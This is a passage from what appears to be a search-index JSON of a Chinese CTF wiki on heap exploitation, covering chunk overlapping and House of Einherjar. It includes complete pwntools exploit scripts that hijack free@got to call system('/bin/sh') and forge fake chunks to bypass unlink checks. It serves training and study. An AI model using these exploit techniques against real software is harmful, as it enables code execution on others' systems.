            "title": "\u57fa\u672c\u793a\u4f8b5\uff1a\u901a\u8fc7extend\u524d\u5411overlapping"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#hitcon-trainging-lab13", 
            "text": "", 
            "title": "HITCON Trainging lab13"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#_3", 
            "text": "\u279c  hitcontraning_lab13 git: ( master )  file heapcreator\nheapcreator: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped\n\u279c  hitcontraning_lab13 git: ( master )  checksec heapcreator [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u7a0b\u5e8f\u4e3a 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#_4", 
            "text": "\u7a0b\u5e8f\u5927\u6982\u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u5668\uff0c\u6bcf\u4e2a\u5806\u4e3b\u8981\u6709\u4e24\u4e2a\u6210\u5458\uff1a\u5927\u5c0f\u4e0e\u5185\u5bb9\u6307\u9488\u3002\u4e3b\u8981\u529f\u80fd\u5982\u4e0b   \u521b\u5efa\u5806\uff0c\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u957f\u5ea6\uff0c\u7533\u8bf7\u5bf9\u5e94\u5185\u5b58\u7a7a\u95f4\uff0c\u5e76\u5229\u7528 read \u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5185\u5bb9\u3002\u8fd9\u91cc\u957f\u5ea6\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u5f53\u957f\u5ea6\u4e3a\u8d1f\u6570\u65f6\uff0c\u4f1a\u51fa\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\u5f53\u7136\uff0c\u524d\u63d0\u662f\u53ef\u4ee5\u8fdb\u884c malloc\u3002\u6b64\u5916\uff0c\u8fd9\u91cc\u8bfb\u53d6\u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002  \u7f16\u8f91\u5806\uff0c\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u4ee5\u53ca\u4e4b\u524d\u5b58\u50a8\u7684\u5806\u7684\u5927\u5c0f\u8bfb\u53d6\u6307\u5b9a\u5185\u5bb9\uff0c\u4f46\u662f\u8fd9\u91cc\u8bfb\u5165\u7684\u957f\u5ea6\u4f1a\u6bd4\u4e4b\u524d\u5927 1\uff0c\u6240\u4ee5\u4f1a \u5b58\u5728 off by one \u7684\u6f0f\u6d1e \u3002  \u5c55\u793a\u5806\uff0c\u8f93\u51fa\u6307\u5b9a\u7d22\u5f15\u5806\u7684\u5927\u5c0f\u4ee5\u53ca\u5185\u5bb9\u3002  \u5220\u9664\u5806\uff0c\u5220\u9664\u6307\u5b9a\u5806\uff0c\u5e76\u4e14\u5c06\u5bf9\u5e94\u6307\u9488\u8bbe\u7f6e\u4e3a\u4e86 NULL\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#_5", 
            "text": "\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528off by one \u6f0f\u6d1e\u8986\u76d6\u4e0b\u4e00\u4e2achunk \u7684 size \u5b57\u6bb5\uff0c\u4ece\u800c\u6784\u9020\u4f2a\u9020\u7684 chunk \u5927\u5c0f\u3002  \u7533\u8bf7\u4f2a\u9020\u7684 chunk \u5927\u5c0f\uff0c\u4ece\u800c\u4ea7\u751f chunk overlap\uff0c\u8fdb\u800c\u4fee\u6539\u5173\u952e\u6307\u9488\u3002   \u66f4\u52a0\u5177\u4f53\u7684\u8fd8\u662f\u76f4\u63a5\u770b\u811a\u672c\u5427\u3002  #!/usr/bin/env python  # -*- coding: utf-8 -*-  from   pwn   import   *  r   =   process ( ./heapcreator )  heap   =   ELF ( ./heapcreator )  libc   =   ELF ( ./libc.so.6 )  def   create ( size ,   content ): \n     r . recvuntil ( : ) \n     r . sendline ( 1 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( size )) \n     r . recvuntil ( : ) \n     r . sendline ( content )  def   edit ( idx ,   content ): \n     r . recvuntil ( : ) \n     r . sendline ( 2 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx )) \n     r . recvuntil ( : ) \n     r . sendline ( content )  def   show ( idx ): \n     r . recvuntil ( : ) \n     r . sendline ( 3 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx ))  def   delete ( idx ): \n     r . recvuntil ( : ) \n     r . sendline ( 4 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx ))  free_got   =   0x602018  create ( 0x18 ,   dada )    # 0  create ( 0x10 ,   ddaa )    # 1  # overwrite heap 1 s struct s size to 0x41  edit ( 0 ,   /bin/sh \\x00   +   a   *   0x10   +   \\x41 )  # trigger heap 1 s struct to fastbin 0x40  # heap 1 s content to fastbin 0x20  delete ( 1 )  # new heap 1 s struct will point to old heap 1 s content, size 0x20  # new heap 1 s content will point to old heap 1 s struct, size 0x30  # that is to say we can overwrite new heap 1 s struct  # here we overwrite its heap content pointer to free@got  create ( 0x30 ,   p64 ( 0 )   *   4   +   p64 ( 0x30 )   +   p64 ( heap . got [ free ]))    #1  # leak freeaddr  show ( 1 )  r . recvuntil ( Content :  )  data   =   r . recvuntil ( Done ! )  free_addr   =   u64 ( data . split ( \\n )[ 0 ] . ljust ( 8 ,   \\x00 ))  libc_base   =   free_addr   -   libc . symbols [ free ]  log . success ( libc base addr:    +   hex ( libc_base ))  system_addr   =   libc_base   +   libc . symbols [ system ]  #gdb.attach(r)  # overwrite free@got with system addr  edit ( 1 ,   p64 ( system_addr ))  # trigger system( /bin/sh )  delete ( 0 )  r . interactive ()", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#2015-hacklu-bookstore", 
            "text": "", 
            "title": "2015 hacklu bookstore"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#_6", 
            "text": "\u279c  2015_hacklu_bookstore git: ( master )  file books    \nbooks: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 3a15f5a8e83e55c535d220473fa76c314d26b124, stripped\n\u279c  2015_hacklu_bookstore git: ( master )  checksec books     [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books \n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u53ef\u4ee5\u770b\u51fa\u8be5\u7a0b\u5e8f\u662f\u52a8\u6001\u94fe\u63a5\u7684 64 \u4f4d\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4e0e NX \u4fdd\u62a4\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#_7", 
            "text": "\u8be5\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u662f\u8ba2\u4e66\uff0c\u5177\u4f53\u5982\u4e0b   \u6700\u591a\u53ef\u4ee5\u8ba2\u8d2d\u4e24\u672c\u4e66\u3002  \u6839\u636e\u7f16\u53f7\u6765\u9009\u62e9\u8ba2\u8d2d\u7b2c\u51e0\u672c\u4e66\uff0c\u53ef\u4ee5\u4e3a\u6bcf\u672c\u4e66\u6dfb\u52a0\u5bf9\u5e94\u7684\u540d\u5b57\u3002\u7136\u800c\u5728\u6dfb\u52a0\u540d\u5b57\u5904\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002  \u6839\u636e\u7f16\u53f7\u6765\u5220\u9664 order\uff0c\u4f46\u662f\u8fd9\u91cc\u53ea\u662f\u5355\u7eaf\u5730 free \u6389\uff0c\u5e76\u6ca1\u6709\u7f6e\u4e3a NULL\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 use after free \u7684\u6f0f\u6d1e\u3002  \u63d0\u4ea4\u8ba2\u5355\uff0c\u5c06\u4e24\u672c\u4e66\u7684\u540d\u5b57\u5408\u5728\u4e00\u8d77\u3002\u8fd9\u91cc\u7531\u4e8e\u4e0a\u9762\u5806\u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u8fd9\u91cc\u4e5f\u4f1a\u51fa\u73b0\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002  \u6b64\u5916\uff0c\u5728\u7a0b\u5e8f\u9000\u51fa\u4e4b\u524d\u5b58\u5728\u4e00\u4e2a \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u3002   \u8fd9\u91cc\u867d\u7136\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u80fd\u529b\u5f88\u5f3a\uff0c\u4f46\u662f\u6240\u6709\u8fdb\u884c malloc \u7684\u5927\u5c0f\u90fd\u662f\u5b8c\u5168\u56fa\u5b9a\u7684\uff0c\u6211\u4eec\u53ea\u80fd\u501f\u52a9\u8fd9\u4e9b\u5206\u914d\u7684 chunk \u6765\u8fdb\u884c\u64cd\u4f5c\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#_8", 
            "text": "\u7a0b\u5e8f\u4e2d\u4e3b\u8981\u7684\u6f0f\u6d1e\u5728\u4e8e\u5806\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u4f46\u662f\u5982\u679c\u60f3\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u5fc5\u7136\u9700\u8981\u6ea2\u51fa\u5bf9\u5e94\u7684dest \u6570\u7ec4\u3002\u5177\u4f53\u601d\u8def\u5982\u4e0b   \u5229\u7528\u5806\u6ea2\u51fa\u8fdb\u884c chunk extend\uff0c\u4f7f\u5f97\u5728 submit \u4e2d  malloc(0x140uLL)  \u65f6\uff0c\u6070\u597d\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u8ba2\u5355\u5904\u7684\u4f4d\u7f6e\u3002\u5728 submit \u4e4b\u524d\uff0c\u5e03\u7f6e\u597d\u5806\u5185\u5b58\u5e03\u5c40\uff0c\u4f7f\u5f97\u628a\u5b57\u7b26\u4e32\u62fc\u63a5\u540e\u6070\u597d\u53ef\u4ee5\u8986\u76d6 dest \u4e3a\u6307\u5b9a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3002  \u901a\u8fc7\u6784\u9020 dest \u4e3a\u6307\u5b9a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a\u4e00\u65b9\u9762\u6cc4\u6f0f __libc_start_main_ret \u7684\u5730\u5740\uff0c \u4e00\u65b9\u9762\u63a7\u5236\u7a0b\u5e8f\u91cd\u65b0\u8fd4\u56de\u6267\u884c \u3002\u8fd9\u65f6\uff0c\u4fbf\u53ef\u4ee5\u77e5\u9053 libc \u57fa\u5730\u5740\uff0csystem \u7b49\u5730\u5740\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u7531\u4e8e\u4e00\u65e6 submit \u4e4b\u540e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u76f4\u63a5\u76f4\u63a5\u9000\u51fa\uff0c\u6240\u4ee5\u6211\u4eec\u6bd4\u8f83\u597d\u7684\u601d\u8def\u5c31\u662f\u4fee\u6539 fini_array \u4e2d\u7684\u53d8\u91cf\uff0c\u4ee5\u4fbf\u4e8e\u8fbe\u5230\u7a0b\u5e8f\u6267\u884c\u5b8c\u6bd5\u540e\uff0c \u91cd\u65b0\u8fd4\u56de\u6211\u4eec\u671f\u5f85\u7684\u4f4d\u7f6e \u3002\u8fd9\u91cc\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u4e2atrick\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u8bfb\u53d6\u9009\u62e9\u7684\u65f6\u5019\u4f1a\u8bfb\u53d6 128 \u5927\u5c0f\uff0c\u5728\u6808\u4e0a\u3002\u800c\u7a0b\u5e8f\u6700\u540e\u5728\u8f93\u51fa dest \u7684\u65f6\u5019\uff0c\u4e4b\u524d\u6240\u8bfb\u53d6\u7684\u90a3\u90e8\u5206\u9009\u62e9\u5fc5\u7136\u662f\u5728\u6808\u4e0a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5982\u679c\u6211\u4eec\u5728\u6808\u4e0a\u9884\u5148\u5e03\u7f6e\u597d\u4e00\u4e9b\u63a7\u5236\u6d41\u6307\u9488\uff0c\u90a3\u5c31\u53ef\u4ee5\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002  \u518d\u6b21\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u8986\u76d6 free@got \u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u8fbe\u5230\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u76ee\u7684\u3002   \u8fd9\u91cc\uff0c\u5404\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u662f   Fini_array0 : 5+8=13  __libc_start_main_ret : 5+0x1a=31\u3002   00:0000\u2502 rsp  0x7ffe6a7f3ec8 \u2014\u25b8 0x400c93 \u25c2\u2014 mov    eax, 0\n01:0008\u2502      0x7ffe6a7f3ed0 \u25c2\u2014 0x100000000\n02:0010\u2502      0x7ffe6a7f3ed8 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ( Order 1: )\n03:0018\u2502      0x7ffe6a7f3ee0 \u2014\u25b8 0x400d38 \u25c2\u2014 pop    rcx\n04:0020\u2502      0x7ffe6a7f3ee8 \u2014\u25b8 0x9f2010 \u25c2\u2014 0x6666666666667325 ( %sffffff )\n05:0028\u2502      0x7ffe6a7f3ef0 \u2014\u25b8 0x9f20a0 \u25c2\u2014 0x3a3120726564724f ( Order 1: )\n06:0030\u2502      0x7ffe6a7f3ef8 \u2014\u25b8 0x9f2130 \u25c2\u2014 0x6564724f203a3220 (  2: Orde )\n07:0038\u2502      0x7ffe6a7f3f00 \u25c2\u2014 0xa35 /*  5\\n  */\n08:0040\u2502      0x7ffe6a7f3f08 \u25c2\u2014 0x0\n... \u2193\n0b:0058\u2502      0x7ffe6a7f3f20 \u25c2\u2014 0xff00000000000000\n0c:0060\u2502      0x7ffe6a7f3f28 \u25c2\u2014 0x0\n... \u2193\n0f:0078\u2502      0x7ffe6a7f3f40 \u25c2\u2014 0x5f5f00656d697474 /*  ttime  */\n10:0080\u2502      0x7ffe6a7f3f48 \u25c2\u2014 0x7465675f6f736476 ( vdso_get )\n11:0088\u2502      0x7ffe6a7f3f50 \u25c2\u2014 0x1\n12:0090\u2502      0x7ffe6a7f3f58 \u2014\u25b8 0x400cfd \u25c2\u2014 add    rbx, 1\n13:0098\u2502      0x7ffe6a7f3f60 \u25c2\u2014 0x0\n... \u2193\n15:00a8\u2502      0x7ffe6a7f3f70 \u2014\u25b8 0x400cb0 \u25c2\u2014 push   r15\n16:00b0\u2502      0x7ffe6a7f3f78 \u2014\u25b8 0x400780 \u25c2\u2014 xor    ebp, ebp\n17:00b8\u2502      0x7ffe6a7f3f80 \u2014\u25b8 0x7ffe6a7f4070 \u25c2\u2014 0x1\n18:00c0\u2502      0x7ffe6a7f3f88 \u25c2\u2014 0xd8d379f22453ff00\n19:00c8\u2502 rbp  0x7ffe6a7f3f90 \u2014\u25b8 0x400cb0 \u25c2\u2014 push   r15\n1a:00d0\u2502      0x7ffe6a7f3f98 \u2014\u25b8 0x7f9db2113830 (__libc_start_main+240) \u25c2\u2014 mov    edi, eax  \uff01\uff01\uff01\u5f85\u8865\u5145\uff01\uff01\uff01", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/#_9", 
            "text": "2016 Nuit du Hack CTF Quals : night deamonic heap", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/", 
            "text": "House Of Einherjar\n\n\n\u4ecb\u7ecd\n\n\nhouse of einherjar \u662f\u4e00\u79cd\u5806\u5229\u7528\u6280\u672f\uff0c\u7531 \nHiroki Matsukuma\n \u63d0\u51fa\u3002\u8be5\u5806\u5229\u7528\u6280\u672f\u53ef\u4ee5\u5f3a\u5236\u4f7f\u5f97 \nmalloc\n \u8fd4\u56de\u4e00\u4e2a\u51e0\u4e4e\u4efb\u610f\u5730\u5740\u7684 chunk \u3002\u5176\u4e3b\u8981\u5728\u4e8e\u6ee5\u7528 \nfree\n \u4e2d\u7684\u540e\u5411\u5408\u5e76\u64cd\u4f5c\uff08\u5408\u5e76\u4f4e\u5730\u5740\u7684chunk\uff09\uff0c\u4ece\u800c\u4f7f\u5f97\u5c3d\u53ef\u80fd\u907f\u514d\u788e\u7247\u5316\u3002\n\n\n\u6b64\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4e00\u4e9b\u7279\u6b8a\u5927\u5c0f\u7684\u5806\u5757\u4e2d\uff0coff by one \u4e0d\u4ec5\u53ef\u4ee5\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size\uff0c\u8fd8\u53ef\u4ee5\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 PREV_INUSE \u6bd4\u7279\u4f4d\u3002\n\n\n\u539f\u7406\n\n\n\u540e\u5411\u5408\u5e76\u64cd\u4f5c\n\n\nfree\n \u51fd\u6570\u4e2d\u7684\u540e\u5411\u5408\u5e76\u6838\u5fc3\u64cd\u4f5c\u5982\u4e0b\n\n\n        \n/* consolidate backward */\n\n        \nif\n \n(\n!\nprev_inuse\n(\np\n))\n \n{\n\n            \nprevsize\n \n=\n \nprev_size\n(\np\n);\n\n            \nsize\n \n+=\n \nprevsize\n;\n\n            \np\n \n=\n \nchunk_at_offset\n(\np\n,\n \n-\n((\nlong\n)\n \nprevsize\n));\n\n            \nunlink\n(\nav\n,\n \np\n,\n \nbck\n,\n \nfwd\n);\n\n        \n}\n\n\n\n\n\n\u8fd9\u91cc\u501f\u7528\u539f\u4f5c\u8005\u7684\u4e00\u5f20\u56fe\u7247\u8bf4\u660e\n\n\n\n\n\u5173\u4e8e\u6574\u4f53\u7684\u64cd\u4f5c\uff0c\u8bf7\u53c2\u8003 \n\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0\n \u90a3\u4e00\u7ae0\u8282\u3002\n\n\n\u5229\u7528\u539f\u7406\n\n\n\u8fd9\u91cc\u6211\u4eec\u5c31\u4ecb\u7ecd\u8be5\u5229\u7528\u7684\u539f\u7406\u3002\u9996\u5148\uff0c\u5728\u4e4b\u524d\u7684\u5806\u7684\u4ecb\u7ecd\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4ee5\u4e0b\u7684\u77e5\u8bc6\n\n\n\n\n\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk \u4f1a\u5171\u4eab \nprev_size\n\u5b57\u6bb5\uff0c\u5c24\u5176\u662f\u5f53\u4f4e\u5730\u5740\u7684 chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u9ad8\u5730\u5740\u7684chunk\u7684\u8be5\u5b57\u6bb5\u4fbf\u53ef\u4ee5\u88ab\u4f4e\u5730\u5740\u7684 chunk \u4f7f\u7528\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u6709\u5e0c\u671b\u53ef\u4ee5\u901a\u8fc7\u5199\u4f4e\u5730\u5740 chunk \u8986\u76d6\u9ad8\u5730\u5740 chunk \u7684 \nprev_size\n \u5b57\u6bb5\u3002\n\n\n\u4e00\u4e2a chunk PREV_INUSE \u4f4d\u6807\u8bb0\u4e86\u5176\u7269\u7406\u76f8\u90bb\u7684\u4f4e\u5730\u5740 chunk \u7684\u4f7f\u7528\u72b6\u6001\uff0c\u800c\u4e14\u8be5\u4f4d\u662f\u548c prev_size \u7269\u7406\u76f8\u90bb\u7684\u3002\n\n\n\u540e\u5411\u5408\u5e76\u65f6\uff0c\u65b0\u7684 chunk \u7684\u4f4d\u7f6e\u53d6\u51b3\u4e8e \nchunk_at_offset(p, -((long) prevsize))\n \u3002\n\n\n\n\n\u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u540c\u65f6\u63a7\u5236\u4e00\u4e2achunk prev_size \u4e0e PREV_INUSE \u5b57\u6bb5\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06\u65b0\u7684 chunk \u6307\u5411\u51e0\u4e4e\u4efb\u4f55\u4f4d\u7f6e\u3002\n\n\n\u5229\u7528\u8fc7\u7a0b\n\n\n\u6ea2\u51fa\u524d\n\n\n\u5047\u8bbe\u6ea2\u51fa\u524d\u7684\u72b6\u6001\u5982\u4e0b\n\n\n\n\n\u6ea2\u51fa\n\n\n\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe p0 \u5806\u5757\u4e00\u65b9\u9762\u53ef\u4ee5\u5199prev_size\u5b57\u6bb5\uff0c\u53e6\u4e00\u65b9\u9762\uff0c\u5b58\u5728off by one\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5199\u4e0b\u4e00\u4e2a chunk \u7684PREV_INUSE \u90e8\u5206\uff0c\u90a3\u4e48\n\n\n\n\n\u6ea2\u51fa\u540e\n\n\n\u5047\u8bbe\u6211\u4eec\u5c06 p1\u7684 prev_size \u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u76ee\u7684 chunk \u4f4d\u7f6e\u4e0ep1\u7684\u5dee\u503c\n\u3002\u5728\u6ea2\u51fa\u540e\uff0c\u6211\u4eec\u91ca\u653ep1\uff0c\u5219\u6211\u4eec\u6240\u5f97\u5230\u7684\u65b0\u7684 chunk \u7684\u4f4d\u7f6e \nchunk_at_offset(p1, -((long) prevsize))\n \u5c31\u662f\u6211\u4eec\u60f3\u8981\u7684 chunk \u4f4d\u7f6e\u4e86\u3002\n\n\n\u5f53\u7136\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u8fd9\u91cc\u4f1a\u5bf9\u65b0\u7684 chunk \u8fdb\u884c unlink \uff0c\u56e0\u6b64\u9700\u8981\u786e\u4fdd\u5728\u5bf9\u5e94 chunk \u4f4d\u7f6e\u6784\u9020\u597d\u4e86fake chunk \u4ee5\u4fbf\u4e8e\u7ed5\u8fc7 unlink \u7684\u68c0\u6d4b\u3002\n\n\n\n\n\u653b\u51fb\u8fc7\u7a0b\u793a\u4f8b\n\n\n\u53ef\u4ee5\u8fdb\u884c House Of Einherjar \u653b\u51fb\u7684\u4ee3\u7801\uff1a\n\n\n#include\n \nstdio.h\n\n\n#include\n \nstdlib.h\n\n\n#include\n \nunistd.h\n\n\n\nint\n \nmain\n(\nvoid\n){\n\n    \nchar\n*\n \ns0\n \n=\n \nmalloc\n(\n0x200\n);\n\u3000\n//\u6784\u9020fake chunk\n\n    \nchar\n*\n \ns1\n \n=\n \nmalloc\n(\n0x18\n);\n \n    \nchar\n*\n \ns2\n \n=\n \nmalloc\n(\n0xf0\n);\n\u3000\n\n    \nchar\n*\n \ns3\n \n=\n \nmalloc\n(\n0x20\n);\n \n//\u4e3a\u4e86\u4e0d\u8ba9s2\u4e0etop chunk \u5408\u5e76\n\n    \nprintf\n(\nbegin\n\\n\n);\n \n    \nprintf\n(\n%p\n\\n\n,\n \ns0\n);\n\n    \nprintf\n(\ninput s0\n\\n\n);\n\n    \nread\n(\n0\n,\n \ns0\n,\n \n0x200\n);\n \n//\u8bfb\u5165fake chunk\n\n    \nprintf\n(\ninput s1\n\\n\n);\n\n    \nread\n(\n0\n,\n \ns1\n,\n \n0x19\n);\n \n//Off By One\n\n    \nfree\n(\ns2\n);\n\n    \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u653b\u51fb\u4ee3\u7801\u5982\u4e0b\uff1a\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\np\n \n=\n \nprocess\n(\n./example\n)\n\n\ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\n#gdb.attach(p)\n\n\np\n.\nrecvuntil\n(\nbegin\n\\n\n)\n\n\naddress\n \n=\n \nint\n(\np\n.\nrecvline\n()\n.\nstrip\n(),\n \n16\n)\n\n\np\n.\nrecvuntil\n(\ninput s0\n\\n\n)\n\n\npayload\n \n=\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x101\n)\n \n+\n \np64\n(\naddress\n)\n \n*\n \n2\n \n+\n \nA\n*\n0xe0\n\n\n\n\np64(address) * 2\u662f\u4e3a\u4e86\u7ed5\u8fc7\n\n\nif (__builtin_expect (FD-\nbk != P || BK-\nfd != P, 0))                      \\\n\n\n  malloc_printerr (\ncorrupted double-linked list\n);  \n\n\n\n\npayload\n \n+=\n \np64\n(\n0x100\n)\n \n#fake size\n\n\np\n.\nsendline\n(\npayload\n)\n\n\np\n.\nrecvuntil\n(\ninput s1\n\\n\n)\n\n\npayload\n \n=\n \nA\n*\n0x10\n \n+\n \np64\n(\n0x220\n)\n \n+\n \n\\x00\n\n\np\n.\nsendline\n(\npayload\n)\n\n\np\n.\nrecvall\n()\n\n\np\n.\nclose\n()\n\n\n\n\n\n\u6ce8\u610f\u8fd9\u91cc\u7ed5\u8fc7unlink\u68c0\u67e5\u7684\u65b9\u6cd5\u8ddf\u4e4b\u524d\u5229\u7528unlink\u6f0f\u6d1e\u65f6\u91c7\u7528\u7684\u65b9\u6cd5\u4e0d\u4e00\u6837\n\n\n\u5229\u7528unlink\u6f0f\u6d1e\u7684\u65f6\u5019\uff1a\n\n\n \np\n-\nfd\n \n=\n \np\n-\n3\n*\n4\n\n \np\n-\nbk\n \n=\n \np\n-\n2\n*\n4\n\n\n\n\n\n\u5728\u8fd9\u91cc\u5229\u7528\u65f6\uff0c\u56e0\u4e3a\u6ca1\u6709\u529e\u6cd5\u627e\u5230 \np\n  ,\u6240\u4ee5\u76f4\u63a5\u8ba9\uff1a\n\n\np\n-\nfd\n \n=\n \np\n\n\np\n-\nbk\n \n=\n \np\n\n\n\n\n\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e00\u4e2a\u70b9\uff1a\n\n\npayload\n \n=\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x101\n)\n \n+\n \np64\n(\naddress\n)\n \n*\n \n2\n \n+\n \nA\n*\n0xe0\n\n\n\n\n\n\u5176\u5b9e\u4fee\u6539\u4e3a\u4e0b\u9762\u8fd9\u6837\u4e5f\u662f\u53ef\u4ee5\u7684:\n\n\npayload\n \n=\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x221\n)\n \n+\n \np64\n(\naddress\n)\n \n*\n \n2\n \n+\n \nA\n*\n0xe0\n\n\n\n\n\n\u6309\u7167\u9053\u7406\u6765\u8bb2 fake chunk \u7684 size \u662f \n0x221\n  \u624d\u5408\u7406\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48  \n0x101\n \u4e5f\u53ef\u4ee5\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u5bf9 size \u548c prev_size \u7684\u9a8c\u8bc1\u53ea\u53d1\u751f\u5728 unlink \u91cc\u9762\uff0c\u800c unlink \u91cc\u9762\u662f\u8fd9\u6837\u9a8c\u8bc1\u7684:\n\n\nif\n \n(\n__builtin_expect\n \n(\nchunksize\n(\nP\n)\n \n!=\n \nprev_size\n \n(\nnext_chunk\n(\nP\n)),\n \n0\n))\n      \\\n      \nmalloc_printerr\n \n(\ncorrupted size vs. prev_size\n);\n     \n\n\n\n\n\u6240\u4ee5\u53ea\u9700\u8981\u518d\u4f2a\u9020 fake chunk \u7684 next chunk \u7684 prev_size \u5b57\u6bb5\u5c31\u597d\u4e86\u3002\n\n\n\u603b\u7ed3\n\n\n\u8fd9\u91cc\u6211\u4eec\u603b\u7ed3\u4e0b\u8fd9\u4e2a\u5229\u7528\u6280\u672f\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\n\n\n\n\n\u9700\u8981\u6709\u6ea2\u51fa\u6f0f\u6d1e\u53ef\u4ee5\u5199\u7269\u7406\u76f8\u90bb\u7684\u9ad8\u5730\u5740\u7684 prev_size \u4e0e PREV_INUSE \u90e8\u5206\u3002\n\n\n\u6211\u4eec\u9700\u8981\u8ba1\u7b97\u76ee\u7684 chunk \u4e0e p1 \u5730\u5740\u4e4b\u95f4\u7684\u5dee\uff0c\u6240\u4ee5\u9700\u8981\u6cc4\u6f0f\u5730\u5740\u3002\n\n\n\u6211\u4eec\u9700\u8981\u5728\u76ee\u7684 chunk 